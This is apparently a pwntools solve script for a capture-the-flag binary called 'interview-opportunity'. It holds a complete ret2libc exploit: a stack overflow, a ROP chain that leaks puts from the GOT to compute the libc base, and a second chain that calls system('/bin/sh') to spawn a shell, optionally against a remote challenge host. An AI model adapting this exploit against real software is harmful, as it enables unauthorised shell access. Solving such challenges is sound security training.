import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']
elf = pwn.context.binary = pwn.ELF("interview-opportunity")

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path, gdbscript="""b *0x00000000004012a5\nc\n""")
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif pwn.args.REMOTE:
    io = pwn.remote("mc.ax", 31081)
    libc = pwn.ELF("./libc.so.6")
else:
    io = pwn.process(elf.path)
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

rop = pwn.ROP(elf)
rop.call(elf.plt.puts, [elf.got.puts])
rop.call(elf.sym['_start'])
print(rop.dump())
payload = b'A'*34
payload += rop.chain()
io.recvuntil(b"?\n")
io.send(payload)
io.recvuntil(b"@\n")
leak = io.recvline().strip()
leak = pwn.u64(leak.ljust(8, b'\x00'))
print(hex(leak))
libc.address = leak - libc.sym.puts
print(hex(libc.address))
bin_sh = next(libc.search(b"/bin/sh\x00"))
rop2 = pwn.ROP(libc)
payload2 = b'A'*34
payload2 += pwn.p64(0x000000000040101a)
rop2.system(bin_sh)
payload2 += rop2.chain()
print(rop2.dump())
io.send(payload2)
io.interactive()
